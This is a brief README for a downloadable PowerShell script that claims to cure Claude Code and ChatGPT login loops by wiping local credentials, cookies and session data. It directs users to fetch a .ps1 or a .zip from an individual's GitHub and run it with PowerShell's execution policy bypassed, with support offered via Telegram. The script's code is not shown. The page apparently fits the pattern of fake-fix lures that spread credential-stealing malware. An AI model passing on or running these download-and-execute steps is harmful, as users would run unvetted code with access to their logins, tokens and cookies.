# Claude Code + ChatGPT Login Reset (Windows PowerShell)

Fix `Claude Code login bug`, `ChatGPT login issue`, and OpenAI/Anthropic
authorization loops on Windows by resetting local credentials, cookies, and
session artifacts.

Useful when it is hard to find the exact broken cookie/token manually.

## What It Fixes
- Claude Code sign-in loops
- ChatGPT/OpenAI auth/login errors
- Stale browser session/cookie state for Claude/ChatGPT domains
- Local credential artifacts that keep broken login state

## Quick Start
1. Download script (.ps1):
   https://github.com/artemiiiw/claude-chatgpt-login-reset-windows/releases/download/v1.1.0/claude-login-reset-clean-start.ps1
2. Run (PowerShell):
```powershell
powershell -ExecutionPolicy Bypass -File .\claude-login-reset-clean-start.ps1 -Mode Safe -DryRun -Language en
```

## Download
- Direct `.ps1`:
  https://github.com/artemiiiw/claude-chatgpt-login-reset-windows/releases/download/v1.1.0/claude-login-reset-clean-start.ps1
- Direct `.zip`:
  https://raw.githubusercontent.com/artemiiiw/claude-chatgpt-login-reset-windows/master/claude-login-reset-clean-start.zip

## Run Examples
```powershell
# English UI
powershell -ExecutionPolicy Bypass -File .\claude-login-reset-clean-start.ps1 -Language en

# Russian UI
powershell -ExecutionPolicy Bypass -File .\claude-login-reset-clean-start.ps1 -Language ru

# Safe real reset for both Claude + ChatGPT/OpenAI
powershell -ExecutionPolicy Bypass -File .\claude-login-reset-clean-start.ps1 -Mode Safe -Product All -ConfirmReset

# Only ChatGPT/OpenAI
powershell -ExecutionPolicy Bypass -File .\claude-login-reset-clean-start.ps1 -Mode Safe -Product ChatGPT -ConfirmReset
```

## Support
- Telegram: `@telegrim`
